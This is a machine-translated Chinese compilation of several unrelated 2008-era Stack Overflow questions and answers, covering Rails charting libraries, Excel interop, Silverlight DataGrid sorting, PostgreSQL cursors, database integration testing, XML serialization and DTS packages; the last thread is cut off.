# ruby-on-rails - 在 Ruby on Rails Web 应用程序中生成图表的首选方式是什么？

> ID：87561
> 
> 赞同：76
> 
> 时间：2008-09-17T20:53:41.917
> 
> 标签：ruby-on-rails, ruby, charts

我想在我的 Ruby on Rails Web 应用程序中添加一些饼图、条形图和散点图。我希望它们具有吸引力，易于添加并且不会引入太多开销。

您会推荐什么图表解决方案？
它有什么缺点（需要 Javascript、Flash、昂贵等）？

* * *

## 回答 #1

> 赞同：59
> 
> 时间：2008-09-17T21:03:57.620

如果您不想使用 Flash，[Google Charts是一个很好的选择。](http://code.google.com/apis/chart/)它本身很容易使用，但对于 Rails，使用[gchartrb](http://badpopcorn.com/blog/2008/09/08/rails-google-charts-gchartrb/) gem 更容易。一个例子：

```
GoogleChart::PieChart.new('320x200', "Things I Like To Eat", false) do |pc| 
  pc.data "Broccoli", 30
  pc.data "Pizza", 20
  pc.data "PB&J", 40 
  pc.data "Turnips", 10 
  puts pc.to_url 
end 
```

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2008-09-18T02:37:12.170

如果您不需要图像，并且可以决定需要 JavaScript，则可以尝试使用 jQuery 插件[flot](http://code.google.com/p/flot/)之类的客户端解决方案。

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2008-09-17T21:06:58.533

我是[Gruff Graphs](http://nubyonrails.com/pages/gruff)的粉丝，但如果您不介意依赖外部服务器， [Google Charts也不错。](http://code.google.com/apis/chart/)

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2008-09-18T21:21:20.470

它~~需要闪存并且~~不是免费的（尽管价格不贵）：[amcharts](http://www.amcharts.com/)。

我已经成功使用它并且喜欢它。不久前我评估了许多选项并选择了它。然而，当时的谷歌图表并不像现在看起来那么成熟。如果我现在要重新评估，我会首先考虑这一点。

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2008-09-18T10:30:03.750

还有[邋遢](http://scruffy.rubyforge.org/)。我最近看了一下代码，它似乎很容易修改/扩展。它产生svg和（通过转换）png。

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2008-09-17T20:55:56.203

你试过[谷歌图表 API](http://code.google.com/apis/chart/)吗？- Web 服务 API 并没有真正简单得多。它可以免费使用，实现简单，而且图表看起来也不会太粗制滥造。

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2008-09-17T20:57:14.017

[Open Flash Chart II](http://pullmonkey.com/projects/open_flash_chart2/)是一个免费选项，可以提供非常好的输出。正如您所料，它确实需要 Flash。

[Fusion Charts](http://www.fusioncharts.com/)更好，但价格为 499 美元。在对此进行研究时，我发现了一个可以满足您需求[的精简版免费版本。](http://www.fusioncharts.com/free/)

* * *

## 回答 #8

> 赞同：6
> 
> 时间：2008-12-14T08:52:36.760

我第二次投票给[flot](http://code.google.com/p/flot/)。最新版本可以让你做一些我以前认为只能通过 Flash 才能实现的动画和动作。文档很棒。手动编写很简单，但对于简单的情况，使用名为[flotilla](http://github.com/joshuamiller/flotilla/tree/master)的 Rails 插件会更容易。您应该查看[示例页面](http://people.iola.dk/olau/flot/examples/)以更好地了解它的功能。缩放和悬停功能尤其令人印象深刻。

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2009-01-06T17:48:03.093

新的 Google Visualization 似乎可以生成比 Google Graphs 类型更多、外观更好、交互性更强的图表。

[http://code.google.com/apis/visualization/](http://code.google.com/apis/visualization/)

* * *

## 回答 #10

> 赞同：4
> 
> 时间：2012-09-27T16:11:06.537

[Morris.js](http://oesmith.github.com/morris.js/)很好而且是开源的。与highcharts相比，我想选择它。[Railscasts](http://railscasts.com/episodes/223-charts-graphs-revised)有一个新的很棒的视频教程

* * *

## 回答 #11

> 赞同：3
> 
> 时间：2008-09-17T21:31:26.103

我刚刚发现[ZiYa](http://ziya.liquidrail.com)制作了一些非常性感的图表，并且是特定于 Rails 的。

缺点是它使用 Flash，如果您不希望站点链接到 XML/SWF 页面，则每个站点的成本为 50 美元。

[我还没有决定，但想把它扔在那里以防人们想投票]

* * *

## 回答 #12

> 赞同：3
> 
> 时间：2008-09-18T02:39:59.543

我在 Java Web 应用程序中广泛使用了 Fusion Charts，但它的工作方式应该与 Rails 相同，因为您只是通过 HTML 或 JavaScript 嵌入 Flash 并传递 XML 数据。这是一个漂亮的软件包，他们的支持一直非常敏感。

* * *

## 回答 #13

> 赞同：3
> 
> 时间：2008-09-18T14:31:33.780

您应该看看[Dmitry Baranovskiy 的名为](http://dmitry.baranovskiy.com)[Raphaël](http://raphaeljs.com)的Javascript 库。

* * *

## 回答 #14

> 赞同：2
> 
> 时间：2008-09-17T20:57:38.413

谷歌图表非常好，但它不是唯一的解决方案。您只需使用您选择的编程语言来动态生成包含数据的 url，然后 google 就会用您的图表返回一个漂亮的图像。

[http://code.google.com/apis/chart/](http://code.google.com/apis/chart/)

* * *

## 回答 #15

> 赞同：2
> 
> 时间：2008-09-18T02:29:07.383

在过去，我决定自己动手（使用 RVG/RMagick），主要是因为 Gruff 没有我想要的一切。缺点是查找和消除图形代码中的所有错误是一件痛苦的事情。这些天来，Gruff 是我的选择，因为它在定制和灵活性方面确实取得了进步。

不过，标准的 Gruff 模板/颜色选择很糟糕，因此您需要亲自动手才能获得最佳效果。

* * *

## 回答 #16

> 赞同：2
> 
> 时间：2008-11-25T15:12:14.003

关于[amcharts](http://www.amcharts.com/)，有一个“免费”版本，其生成 Flash 图表的限制很少，包括“amCharts.com 的图表”提及。

还有一个不错的插件[ambling](http://ambling.rubyforge.org/)，它为您提供了一些帮助方法来轻松地将图表添加到您的视图中。请注意[amCharts.com 参考文档](http://www.amcharts.com/docs/)仍然是根据您的要求定制图表的必要条件。

* * *

## 回答 #17

> 赞同：2
> 
> 时间：2009-06-22T18:32:03.080

GoogleCharts 和 Gruff 图表很棒，但有时它们缺少一些我需要进行更科学绘图的功能。gnuplot 有一个 gem，它可能对其中一些情况有所帮助。

[http://rgplot.rubyforge.org/](http://rgplot.rubyforge.org/)

* * *

## 回答 #18

> 赞同：2
> 
> 时间：2011-02-16T01:19:27.403

我已经开始使用[protovis](http://vis.stanford.edu/protovis/)通过 javascript 生成 SVG 图表。我在 Rails 中的基本方法是有一个控制器，它返回要绘制为 JSON 的数据，然后用一些 javascript 和 protovis 将其收集起来。

唯一的缺点是，完整的 IE 支持（因为它基于 SVG）目前无法直接开箱即用......但是，当前的补丁程序可以很好地提供 IE 支持，可以在[此处](http://code.google.com/p/protovis-js/issues/detail?id=15)找到详细信息。

* * *

## 回答 #19

> 赞同：1
> 
> 时间：2011-02-14T21:07:27.253

我个人更喜欢基于 JavaScript 的图表而不是 Flash。如果没关系，还请查看[High Charts](http://highcharts.com)。[Rails 插件](https://github.com/loudpixel/highcharts-rails)也可用。

* * *

## 回答 #20

> 赞同：1
> 
> 时间：2012-10-15T20:07:18.470

gchartrb gem 似乎不再维护。作者[指出](https://github.com/deepakjois/gchartrb/issues/1)了这些宝石：

*   [谷歌图表](https://github.com/mattetti/googlecharts)
*   [gchart](https://github.com/abhay/gchart/)（似乎也被放弃了）

* * *

## 回答 #21

> 赞同：0
> 
> 时间：2008-09-17T23:42:38.580

我们通过使用 gnuplot 将图表生成为 PNG 服务器端来做到这一点。它有点老派，图表不是交互式的，但它可以工作并且可以缓存。

（我们这样做的另一个原因是我们可以在报告的 PDF 版本中放置完全相同的图表）。

* * *

## 回答 #22

> 赞同：0
> 
> 时间：2008-09-18T03:56:12.637

然而，这并不是专门的 RoR，它是 Gruff 到 javascript 的非常巧妙的端口：http: [//bluff.jcoglan.com/](http://bluff.jcoglan.com/)

* * *

## 回答 #23

> 赞同：0
> 
> 时间：2008-09-18T14:21:43.380

[图表导演](http://www.advsofteng.com/)。丑陋的 API，但很好的服务器端图像结果。自包含二进制文件。

* * *

## 回答 #24

> 赞同：0
> 
> 时间：2008-09-20T16:37:51.360

FWIW，当适合和完成很重要时，我不喜欢使用 Google Charts。我发现调整大小的变量尤其是不可预测的——图表有它自己的作用。

我还没有玩过 Gruff/Bluff/etc.，但是对于一个知名度更高的项目，我不会使用 Google Charts。

* * *

## 回答 #25

> 赞同：0
> 
> 时间：2008-09-22T09:11:19.870

如果您想要非常性感、易于生成并且可以启用 Flash 的图表，那么您绝对应该看看[maani.us xml/swf 图表](http://www.maani.us/xml_charts/)。

它背后有一些 XML 构建器，您就可以开始了。

* * *

## 回答 #26

> 赞同：0
> 
> 时间：2009-03-22T06:55:41.193

[FusionCharts](http://www.fusioncharts.com)是一款非常优秀的图表产品。与 RoR 配合得很好。他们的支持和论坛很好。该产品的免费版本具有数量有限的图表和功能，但没有水印。

* * *

## 回答 #27

> 赞同：0
> 
> 时间：2011-05-22T23:13:23.577

我刚开始在我的 rails 3 项目中使用 googlecharts。它既漂亮又干净，似乎是唯一一个基于谷歌可视化 api 的 gem。其他人不活跃，主要使用旧的谷歌图表 api（在 2007-2008 年的某个地方发布）。

[https://github.com/mattetti/googlecharts](https://github.com/mattetti/googlecharts)

* * *

## 回答 #28

> 赞同：0
> 
> 时间：2013-02-23T06:56:43.497

[D3](http://d3js.org/)已成为我向 Web 应用程序添加漂亮图表的首选方式。您必须做一些其他框架的工作，但外观和控制胜过这一点。

我主要使用 SVG，这意味着没有 IE8，但这已不再是一个问题。

* * *

## 回答 #29

> 赞同：0
> 
> 时间：2014-02-09T04:22:36.703

[HighChart](http://www.highcharts.com/products/highcharts) - 用纯 JavaScript 编写的图表库

像[highchart-rails](https://github.com/PerfectlyNormal/highcharts-rails)，[lazy-high-chart](https://github.com/michelson/lazy_high_charts)这样的宝石使与 rails 的集成更容易

* * *

## 回答 #30

> 赞同：0
> 
> 时间：2015-12-18T03:34:14.540

`gem 'chart'`可以轻松地将 ChartJS 和 NVD3 图表添加到 rails。

# c# - 有没有人有从 .Net 应用程序控制多个 Excel 实例的好例子？

> ID：87576
> 
> 赞同：2
> 
> 时间：2008-09-17T20:55:47.077
> 
> 标签：c#, .net, vb.net, excel

我们有一个基于 Excel 2002/XP 的应用程序，它与 SQL 2000/5 交互以处理相当复杂的精算计算。该应用程序可以很好地执行其功能，但很难管理。

我们正在尝试创建一个“控制器”应用程序或服务，可以管理和监控这些 Excel 的各种实例（启动/停止/处理命令等），但不幸的是，这有点像 InterOp 的噩梦。

有没有人有一个在 VB.Net 或 C# 中做这样的事情的好（即工作）例子？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-09-18T08:01:33.403

不要这样做！

我们尝试了数周来让类似的东西发挥作用，但它的表现并不像宣传的那样。甚至不要开始 - 立即放弃！

您真正拥有的唯一选择是基于重型服务器端 MOSS 的实现 - Excel (Web) 服务（他们称之为类似的东西）。基于 Windows 的 COM Excel 互操作几乎已死，将被 MOSS 取代。

另一种选择是使用 SpreadsheetGear。它实际上是一个很棒的产品

1.  速度极快
2.  该引擎与 UI 是分开的，因此您可以使用它来做 Excel 的东西服务器端（没有安装办公室）
3.  相当便宜
4.  有一个类似于现有 Excel COM api 的 API，因此移动代码相对容易

这完全取决于您在电子表格中需要的公式。查看 Spreadsheet Gear 的公式列表，如果有匹配项，那就去吧。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-26T22:05:23.180

互操作工作正常，只是您总是引用未释放的 Excel 对象，因此 Excel 实例不会关闭。以下知识库文章解释了原因：

[http://support.microsoft.com/default.aspx/kb/317109/EN-US/](http://support.microsoft.com/default.aspx/kb/317109/EN-US/)

如果您为一组有限的互操作场景编写了非常仔细的代码，则可以避免该问题。但在一般情况下，很难让它可靠地工作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-09-18T01:24:12.033

您可能想看看这个产品：[http ://www.spreadsheetgear.com/products/spreadsheetgear.net.aspx](http://www.spreadsheetgear.com/products/spreadsheetgear.net.aspx)

它都是托管代码和直接 .NET 库。没有 InterOp 头痛。我自己没有使用过它，但我从金融界的人那里听到了非常好的事情。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-09-18T12:35:20.237

我们编写了一个服务来控制 Excel 2003 的单个实例。我们从来没有设法让 Excel 实例干净地关闭，所以我们在第一次访问该服务时启动一个实例，并且只使用它，序列化客户端请求。

# vb.net - Silverlight DataGrid 控件 - 如何停止对列的排序？

> ID：87587
> 
> 赞同：3
> 
> 时间：2008-09-17T20:56:37.573
> 
> 标签：vb.net, silverlight, web-services, xaml, datagrid

继续我昨天的问题，我从这个[问题](https://stackoverflow.com/questions/74461/silverlight-datagrid-control-selection-changed-event-interfering-with-sorting)获得的 Silverlight 数据网格 现在在对包含大量数据的列进行排序时导致 Stack Overflow 错误（例如包含 SQL 语句的 where 子句的文本列）。排序时，它会触发数据网格的 SelectedIndexChanged 事件，然后仍然尝试存储。如果再次单击标题，则会发生堆栈溢出。

有谁知道如何停止对列的此控件的排序？所有其他列的排序都很好（但仍然会触发该死的 SelectedIndexChanged 事件），但如果我可以关闭 whereClause 的列，那就完美了。

有没有人对如何让它发挥作用有更好的想法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-16T21:26:35.217

我只熟悉这个数据网格的 WPF 版本，但试试这个：

```
<data:DataGridTextColumn CanUserSort="False" Header="First Name" Binding="{Binding FirstName}" /> 
```

在您不想排序的每一列上添加 CanUserSort="False" 属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-09-17T22:15:50.253

试一试：

```
dataGridView1.Columns[*Numberofthecolumnyoudontwantsorted*].SortMode
= DataGridViewColumnSortMode.NotSortable; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-09-18T13:16:13.320

@BKimmel - 因为这是silverlight，所以它不起作用，显然网格列的那部分还没有处理。在页面的 XAML 中，它没有显示列上的 sortmode 属性，并且在后端代码中，它无法识别它，因为它不是 Web 控件，而是 silverlight 控件。

不过谢谢。还有谁？

# mysql - Datarepeater 中的文本框动态“数据绑定”

> ID：87590
> 
> 赞同：0
> 
> 时间：2008-09-17T20:57:02.270
> 
> 标签：mysql, vb.net, datarepeater

我需要知道是否可以将驻留在数据中继器中的文本框动态绑定到“动态”创建的 BindingSource。我正在使用 VB.net。我使用的数据库是 MySQL 数据库。

由于数据库不是永久驻留在同一台服务器上，因此我必须动态使用连接。

[编辑]
好的，所以在提问时我似乎是个傻瓜。我正在制作的应用程序不是基于网络的。它是一个简单的（我希望如此）应用程序，它连接到 MySQL 数据库，访问一个表，以便我可以编辑/查看它。当前设置使用添加数据源向导。我已经成功地使用 mysql 连接器 dll 动态连接到 dbase，但没有在设计时将文本框设置为数据源，我不确定如何通过数据中继器“链接”它们。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-09-17T20:59:37.770

您的连接字符串应该在您的 Web.Config 中定义，如果您将数据库移动到不同的服务器，只需修改 web.config 条目即可。只要您保持连接字符串名称相同，BindingSource 对象就会从配置中获取新值。

* * *

**编辑**

事实上，与上面列出的网络应用程序答案相同的概念在这里应该适用。

您的所有数据对象都应该是硬编码的，它只是将被修改的连接字符串（您必须向用户询问，或者在数据库移动时作为更新推出）。

例如，在您的项目中创建一个 App.Config 文件。让您的配置值之一是连接字符串。此配置值将是您在需要时获取连接字符串的地方。然后您的向导将在那里允许用户轻松修改连接。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2010-01-13T16:11:22.297

然后查看 app.config

连接字符串应该在那里。

如果不是，那么您应该将它放在这里，因为您可以随时更改此文件，而不必重新编译您的应用程序。

# java - 使用 JDBC 时，Oracle 的 REF CURSOR 在 Postgresql 中的等价物是什么？

> ID：87603
> 
> 赞同：1
> 
> 时间：2008-09-17T20:58:09.257
> 
> 标签：java, oracle, postgresql, jdbc, plsql

**在 Oracle 中，我可以声明一个引用游标...**

```
TYPE t_spool IS REF CURSOR RETURN spool%ROWTYPE; 
```

**...并使用它来传递游标作为返回值...**

```
FUNCTION end_spool
    RETURN t_spool
    AS
    v_spool t_spool;
    BEGIN
        COMMIT;
        OPEN v_spool FOR
            SELECT
                *
            FROM
                spool
            WHERE
                key = g_spool_key
            ORDER BY
                seq;
        RETURN v_spool;
    END end_spool; 
```

**...然后使用 JDBC 将其捕获为结果集...**

```
private Connection conn;
private CallableStatement stmt;
private OracleResultSet rset;
[...clip...]
stmt = conn.prepareCall("{ ? = call " + call + "}");
stmt.registerOutParameter(1, OracleTypes.CURSOR);
stmt.execute();
rset = (OracleResultSet)stmt.getObject(1); 
```

**Postgresql 中的等价物是什么？**

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-09-17T21:37:50.063

也许这会有所帮助：http: [//jdbc.postgresql.org/documentation/83/callproc.html#callproc-resultset-setof](http://jdbc.postgresql.org/documentation/83/callproc.html#callproc-resultset-setof)

我之前并没有真正搞砸过：P

# c++ - 使用数据库自 动集成测试 C++ 应用程序

> ID：87610
> 
> 赞同：8
> 
> 时间：2008-09-17T20:59:09.690
> 
> 标签：c++, database, automated-tests, integration-testing

我正在向一个成熟的应用程序引入自动化集成测试，该应用程序到目前为止只经过手动测试。

该应用程序基于 Windows，并与 MySQL 数据库对话。

就将发生的数据库事务而言，保持测试相互独立的最佳方法是什么（包括推荐的任何工具的详细信息）？

（出于此特定目的修改应用程序源不是一种选择。）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-09-17T21:30:44.637

你如何验证结果？

如果您需要查询数据库（听起来您可能会这样做）以获取结果，那么我同意 Kris K 的观点，但我会努力在每个测试用例之后重建数据库，而不仅仅是每个套件。

这有助于避免危险的[交互测试](http://xunitpatterns.com/Erratic%20Test.html)

至于工具，我会推荐[CppUnit](http://cppunit.sourceforge.net/doc/lastest/index.html)。您并没有真正进行单元测试，但这并不重要，因为 xUnit 框架应该为您提供设置和拆卸框架，您需要自动设置[测试夹具](http://xunitpatterns.com/Fixture%20Setup%20Patterns.html)

显然，这可能会导致测试运行缓慢，具体取决于您的数据库大小、人口等。您可以附加/分离数据库，而不是删除/重建数据库。

如果您对进一步研究感兴趣，请查看[XUnit 测试模式](http://www.xunitpatterns.com)。对于这类事情，这是一本好书和一个很好的网站。

并感谢自动化:)

缺口

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-09-17T21:03:25.780

您可以为每个测试套件转储/恢复数据库等。由于您正在自动执行此操作，因此它可能是设置/拆卸功能中的某些内容。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-09-17T21:25:25.367

我曾经在数据库相关单元测试类的SetUp函数中恢复数据库。这样可以确保每个测试在相同的条件下运行。

您可以考虑为测试准备特殊的数据库内容，即使用比当前生产版本更少的数据（以保持合理的恢复时间）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-17T21:10:34.233

我相信，进行此类测试的最佳环境是 VMWare 或类似的环境。设置您的数据库、事务日志等，然后记录全部内容 - 数据库以及配置。然后重新测试，重新加载图像和数据库并开始测试。随着系统的变化，这仍然需要维护测试，但至少测试是可重复的，这是集成测试中最大的挑战之一。

对于测试自动化，很多人使用 Perl，但我们发现 Perl 程序像 Topsy 一样增长并且变得复杂。如果您尝试构建一系列结构化测试，那么使用 Python 作为脚本语言（我们运行 C++ 测试）是值得的。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-09-17T21:10:43.327

正如@ [Kris K.](https://stackoverflow.com/questions/87610/automated-integration-testing-a-c-app-with-a-database#87642)所说，在每次测试之间转储和恢复数据库可能是要走的路。

由于您正在考虑在应用程序外部进行测试，因此我希望以一种可以利用更好的测试工具的语言构建测试框架。

如果您使用 Java 构建测试框架，您可以利用[JUnit](http://www.junit.org/)，甚至可能利用[FitNesse](http://fitnesse.org/)之类的东西。

不要认为仅仅因为被测应用程序是 C++ 就意味着你被困在使用 C++ 进行自动化测试。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2009-04-21T10:04:59.647

请尝试 AnyDbTest，我认为它正是您正在寻找的工具。（[www.anydbtest.com](http://www.anydbtest.com)）。

特征：

*   1.用 Xml 编写测试用例，而不是 Java/C++/C#/VB 代码。不需要那些昂贵的编程工具。

*   2.支持所有流行的数据库，如Oracle/SQL Server/My SQL

*   3\. 支持多种断言，如 StrictEqual、SetEqual、IsSupersetOf、Overlaps 和 RecordCountEqual 等。另外，大多数断言可以前缀逻辑而不是运算符。

*   4.允许使用 Excel 电子表格/Xml 作为测试数据的来源。如您所知，Excel 电子表格可以轻松创建/编辑和维护测试数据。

*   5.支持沙盒测试模型，如果在沙盒中进行一项测试，则每个数据库上的所有数据库操作都将回滚，意味着任何更改都将被撤消。

*   6.允许在测试初始化​​和完成阶段执行从一个数据库/Excel到目标数据库的数据泵送。这是为测试准备测试数据的简单方法。

*   7.独特的跨不同类型数据库测试，即目标和参考结果集可以来自两个数据库，一个是SQL Server，另一个是Oracle。

*   8.设置记录集的样式比较。AnyDbTest 将告诉您两个记录集之间的交集、盈余或缺失。

*   9.记录集或标量值的顺序样式比较。这意味着两个结果集将按其原始顺序进行比较。

*   10.允许将SQL语句的结果集导出到Xml/Excel文件中。

# vba - Win32 ShellExecute 和 UNC 路径

> ID：87612
> 
> 赞同：2
> 
> 时间：2008-09-17T20:59:27.817
> 
> 标签：vba, flash, powerpoint

我想在 Powerpoint 2007 中启动一个 Flash 演示文稿。我正在调用 Win32 ShellExecute() 例程。当我从路径为 UNC 路径 (\myserver\myfolder\sample.ppt) 的位置运行它时，它不起作用。

ShellExecute 例程需要 6 个参数，其中之一是运行它的路径。我尝试将此参数设置为 C:\ 以及使用 ActivePresentation.Path （这是一个 UNC 路径）。两者都不起作用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-09-18T10:08:09.793

我最初尝试了这种方法，但发现它会导致问题：

*   在未连接到网络的笔记本电脑上使用演示文稿时。
*   如果用户无权访问 UNC。
*   如果 Flash 文件被重命名、移动或删除。

我发现更好的方法是将文件嵌入到 Powerpoint 文件中。

使用 Office XP、Powerpoint 可以如下完成

从**“查看”**菜单中选择**“工具栏”**并勾选**“控制工具箱”**

在**“控件工具箱”**工具栏上单击**“更多控件”**图标

将显示控件列表。向下滚动直到找到**“Shockwave Flash Object”**，然后单击它。

这应该将您的光标更改为十字准线。移动到幻灯片上要插入**'Shockwave Flash Object' 的**区域。左键单击，按住并拖动以创建所需大小的框。

接下来右键单击您刚刚插入的控件并选择**'Properties'**。

设置以下属性

```
* Autoload = True
* EmbedMovie = True
* Enabled = True
* Loop = True
* Playing = True
* Visible = True
* Movie = c:\flash.swf (Change this to the location of your .swf file) 
```

关闭“属性”控件

保存文件。

关闭文件。

重新打开文件。

当您在幻灯片放映期间到达幻灯片时，.swf 文件应该会自动开始播放。

我发现在 .swf 文件中包含控件（暂停/播放、时间线）很有用

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-09-17T21:01:49.340

UNC 路径以*双*反斜杠开头。你是这样做的，还是只是问题中的一个错字？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-09-17T21:05:14.543

我已经将驱动器映射到 UNC 路径。

命令行看起来像

subst A：“\\ServerName\SomeDirectory”

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-17T21:42:45.513

好吧，现在它似乎与 unc 路径一起工作得很好。

# c# - 如何将 XML 映射到 C# 对象

> ID：87621
> 
> 赞同：28
> 
> 时间：2008-09-17T21:00:32.103
> 
> 标签：c#, xml, serialization, xml-serialization

我有一个想要加载到对象的 XML，操作这些对象（设置值、读取值），然后将这些 XML 保存回来。在我创建的结构 (xsd) 中包含 XML 对我来说很重要。

一种方法是编写我自己的序列化程序，但是否有内置支持或 C# 中的开源可以使用？

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2008-09-17T21:03:24.187

您可以使用 xsd.exe 从架构 (xsd) 生成可序列化的 C# 类：

```
xsd.exe dependency1.xsd dependency2.xsd schema.xsd /out:outputDir 
```

如果架构具有依赖项（包含/导入的架构），则它们必须全部包含在同一命令行中。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2008-09-17T21:45:27.957

此代码（C# DotNet 1.0 及更高版本）可以很好地将大多数对象序列化为 XML。（和返回）它不适用于包含 ArrayLists 的对象，如果可能的话坚持只使用 Arrays

```
using System;    
using System.IO;
using System.Text;
using System.Xml.Serialization;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;

public static string Serialize(object objectToSerialize)
{
    MemoryStream mem = new MemoryStream();          
    XmlSerializer ser = new XmlSerializer(objectToSerialize.GetType());         
    ser.Serialize(mem, objectToSerialize);                      
    ASCIIEncoding ascii = new ASCIIEncoding();
    return ascii.GetString(mem.ToArray());
}        

public static object Deserialize(Type typeToDeserialize, string xmlString)
{
    byte[] bytes = Encoding.UTF8.GetBytes(xmlString);
    MemoryStream mem = new MemoryStream(bytes);         
    XmlSerializer ser = new XmlSerializer(typeToDeserialize);
    return ser.Deserialize(mem);
} 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2008-09-17T21:02:47.090

如果您使用的是 .net 3.5， LINQ [to XML非常强大，](http://msdn.microsoft.com/en-us/library/bb308960.aspx) [LINQ to XSD](http://www.hanselman.com/blog/LINQToEverythingLINQToXSDAddsMoreLINQiness.aspx)也可能对您有用！

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-09-17T21:03:00.977

使用 Visual Studio 附带的 xsd.exe 命令行程序创建可以在项目/解决方案中使用的类文件，并使用 System.Xml.Serialization 命名空间（特别是 XmlSerializer 类）来序列化/反序列化这些类磁盘。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-09-17T21:07:33.007

使用 System.Xml.Serialization；如果要将 xml 映射到任何随机对象，此命名空间具有您需要的所有属性。或者，您可以使用 xsd.exe 工具

xsd 文件.xsd {/类 | /dataset} [/element:element] [/language:language] [/namespace:namespace] [/outputdir:directory] ​​[URI:uri] 它将获取您的 xsd 文件并从中创建 c# 或 vb.net 类。

[http://msdn.microsoft.com/en-us/library/x6c1kb0s(VS.71).aspx](http://msdn.microsoft.com/en-us/library/x6c1kb0s(VS.71).aspx)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2011-04-18T07:26:48.830

Microsoft 的 xsd.exe 有很多错误 :| 试试这个开源珍珠[http://xsd2code.codeplex.com/](http://xsd2code.codeplex.com/)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2011-09-13T10:21:46.973

我们创建了一个框架，可以从您的 XML 中自动生成 C# 类。它是一个可视项目模板，您可以将 XML 传递给该模板，并且这些类会在您的项目中自动生成。使用这些类，您可以创建/读取/写入您的 XML。

检查此链接以获取框架和 Visual C# 项模板：[单击此处](https://web.archive.org/web/20121103082137/http://www.stepupframeworks.com/Home/products/xml-object-mapping-xom)

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2012-01-19T22:11:20.163

我同意 xsd 真的很垃圾……但他们制作了另一个几乎没人知道的版本。它称为 xsd 对象生成器。它是下一个版本，并且有更多选择。它从 XSD 生成文件并且效果很好。如果你有像 XML spy 这样的模式生成器；从您的 xml 创建一个 xsd 并使用此工具。我使用这个工具创建了非常非常复杂的类。然后为额外的属性\方法等创建部分类，然后当您更新架构时，您只需重新生成您的类，并且任何编辑都会保留在您的部分类中。

[http://www.microsoft.com/download/en/details.aspx?displaylang=en&id=7075](http://www.microsoft.com/download/en/details.aspx?displaylang=en&id=7075)

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-09-17T21:02:19.247

我敢打赌 NetDataContractSerializer 可以做你想做的事。

# sql-server - 如何在 DTS 数据转换任务中使用存储过程？

> ID：87647
> 
> 赞同：5
> 
> 时间：2008-09-17T21:04:16.137
> 
> 标签：sql-server, dts

我有一个带有数据转换任务（数据泵）的 DTS 包。我想使用带参数的存储过程的结果来获取数据，但 DTS 不会预览结果集，也无法定义数据转换任务中的列。

有没有人让这个工作？

警告：存储过程使用两个临时表（并清理它们，当然）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-09-17T21:46:07.173

为存储过程参数输入一些有效值，以便它运行并返回一些数据（甚至没有数据，您只需要列）。然后您应该能够进行映射/等。然后进行断开连接的编辑并更改为实际参数值（我假设您是从全局变量中获取它们的）。

```
DECLARE @param1 DataType1  
DECLARE @param2 DataType2
SET @param1 = global variable  
SET @param2 = global variable (I forget exact syntax)  

--EXEC procedure @param1, @param2  
EXEC dbo.proc value1, value2 
```

基本上你像这样运行它，这样程序就会返回结果。进行映射，然后在断开连接的编辑中注释掉第二个`EXEC`并取消注释第一个`EXEC`，它应该可以工作。

基本上你只需要让程序运行并吐出结果。即使您没有返回任何行，它仍然会正确映射列。我无权访问我们的生产系统（甚至数据库）来创建 dts 包。所以我在一个虚拟数据库中创建它们，并将存储过程替换为返回生产应用程序将运行的相同列但没有数据行的东西。然后在映射完成后，我用真实的程序将它移到生产箱中，它就可以工作了。如果您通过脚本跟踪数据库，这将非常有用。您可以只运行脚本来构建一个空的 shell 过程，然后在完成后运行脚本来放回真正的过程。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-09-17T21:15:36.733

您需要将它们实际加载到表中，然后如果必须进行转换，则可以使用 SQL 任务将其从该表移动到 perm 位置。

但是，我发现如果使用存储过程来获取数据，几乎可以同时快速轻松地将其移动到目的地！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-09-17T21:16:30.583

不，我只能通过让 DTS 将状态保存在废品表中来存储过程。

# svn - 在 Subversion 中移动目录结构的首选方法是什么？

> ID：87666
> 
> 赞同：2
> 
> 时间：2008-09-17T21:06:49.920
> 
> 标签：svn

我最近遇到了一个问题，我想在我的项目的目录结构中添加一个文件夹，该文件夹将成为以前存放的文件的新“根”目录。我一直在[相关线程](https://stackoverflow.com/questions/87458/can-you-specify-filenames-using-wildcards-or-regexes-in-the-subversion-mv-comma)中获得帮助，但我想提出一个更开放的问题，以了解最佳实践可能是什么。

